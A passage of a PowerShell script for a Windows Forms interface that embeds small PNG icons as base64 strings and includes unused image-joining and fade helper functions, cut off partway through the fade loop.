srJq4yrndcsr3X0W/S3/2TxU/uA5UDHdavrXTesb3QPLh88M+QwdP6m681Lt7xuXbu94vbgcOjwnZHokdE77DtTd1PuvriXeW/h/sYH6AdFD6UeVjxSfNTws+7PbaOWo6fHXMf6Hwc/vj/OGn/2S8Yv7ycKnpCfVEyqTDZPmU2dmnafvvF05dOJZ+nPFmYKf5X+tfa5zvMffnP8rX82YnbiBf/Fp99LXsq/PPRq2aueuYC5R69TXy/MF72Rf3P4LeNt37vwd5MLWe+x7ys/6H7o/ujz8cGn1E+f/gUDmPP8usTo0wAAAAlwSFlzAAALEgAACxIB0t1+/AAAAg5JREFUWEfFltuuwiAURP3/b/MPvMQXH9TExAcvMSqH4TCEDUNDG0/PJCuU2buUcmsXzrl/RZpzIs05keYIKBXrQpojoFSsC2mOgFKxLqQ5AkrFupCm4nA4uOPx6C+NTyUPOcjNvSGkmYPGzuez+3w+vurcbrdDwTgV6jEWcnFPT0ekSVarlXu/3/7yt9HL5eI2mw2qzKFCHTHksLO4F20g1kKaADeyocfjUT6YUMZHLu6B0MZQJ6SZP1zMew6lYmE9QEOdqAzwer184cI8oj4ApWKB2IaLbVbxyuANz+cTRRUvoFQsEduSL2QqWLUc+u12i8LEBZSKJWJboe1yZ5jE/X7vC+eu1ysKE2tAqZghtuniM5Jvku73uy+qvT4EpWIGnhHxGck3SRx+L+MPQKmYglOcvDwImqv1G3B3eSUvXcTF0bv6J8HdkC/EMmmWDnglzyR4ePaX/lfgd8UreTKh5ys2Fk5x+YImqbVXv0HrjDFJ3Kt/sQ44/+UZY5IAp6Hx+Z1EbEuuL1MBHAUkf2MtoA2+lDphTYXwZ6I8NqfA473VVmUA9JqnFuZuykicTieupaDb7YaiyqsMkncCQ6iGrwWnkVoulyhkrjQJOsGtCaEj+M1Sv1fwEON8Q7gXI+FlcnOkWYJVnA9nj9brNQrZXo40W+At8duNzmSf7nAND7HWz2cLac6JNOfDLX4ALpHaPfgv6/oAAAAASUVORK5CYII='));


<#
# Network Image
# Little monitor with a cable on the side
# File format: Png
# todo: different image if no inet access or wifi
#>
$NetImg = [System.Drawing.Image]::FromStream([System.IO.MemoryStream][System.Convert]::FromBase64String('iVBORw0KGgoAAAANSUhEUgAAACAAAAAjCAYAAAD17ghaAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAABn0lEQVRYR8WWi46CMBBF/f8/FTSSEJGXdDndDintsKLU7iRnae/0MZ0+3JMx5l9RxZyoYk5UMSf8SWZd15lhGFzt157Pp3k8HmYcR1vm27atqevaFEVho7CGg84hYlt+HwKAvu8taFKWuiBmA2DwsiylvnC9XtGsn1WgpYAMEBCGYG63mxrA5XKxaXMRr3xHIVMYFWt+enzEN1s0yBFWGXhlXw+ACUg3iFHmDHiZiAY5wioAVxGnmaZpqePLkgFXjsgSgDwOrr6AlmULMCbjrvuPiZs43KIkLNdQJpPVipEVdDifz0jqQJ/iFrUW5bnlC6E/JWoAIKsO9dT8GYB2IFPjP8UrOIhN08zF2JcS9+OmO+73+1yMfSlxc8QO0s82fPMQMvZmAHI4uA2U98B+yjvC9lVVZSeQKx625eue++0A5Eq+QsxvL5P57agTXBiUGgCD7dkCebz2tteIBAJg0FDfQlYS6nuJhE8CeKd9SCS8M2DWLeD/eHw+rp01yqGfPrOtxgmJBDppHdGY5B0+CiA3qpgTVcyJKuZEFfNhTj87TTB3HW1HrwAAAABJRU5ErkJggg=='));


<#
# Camera Image
# a camera on a dark background
# File format: Png
# note: the background should be opaque. maybe able to be done in code
#>


<#
# Globe Image
# a wire frame globe on a dark background
# File format: Png
# note: the background should be opaque. maybe able to be done in code
#>


<#
# Arrow Image
# a arrow on a brownish background
# File format: Png
#>

## Colour Settings
$CT = 'Transparent';
$CW = 'White';
 
# function not used part of fade fuction
function joinImg($img1, $img2, $imgAtt)
{
    $result = New-Object System.Drawing.Bitmap($img2);
    $p = [System.Drawing.Graphics]::FromImage($result);
    $p.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic;
    $p.DrawImage($img1, (New-Object System.Drawing.Rectangle(0,0, $img2.Width, $img2.Height)), 0, 0, $img2.Width, $img2.Height, [System.Drawing.GraphicsUnit]::Pixel, $imgAtt);
    $p.Dispose();
    $result;    
}

# function not used please see readme.md todo section
function doFade
{
    $cm = New-Object System.Drawing.Imaging.ColorMatrix;
    $ia = New-Object System.Drawing.Imaging.ImageAttributes;
    $transparency = [double]1.0;
    While ([double]$transparency -gt 0)
    {
        $cm.Matrix33 = $transparency;
        $MainForm.Refresh();
    }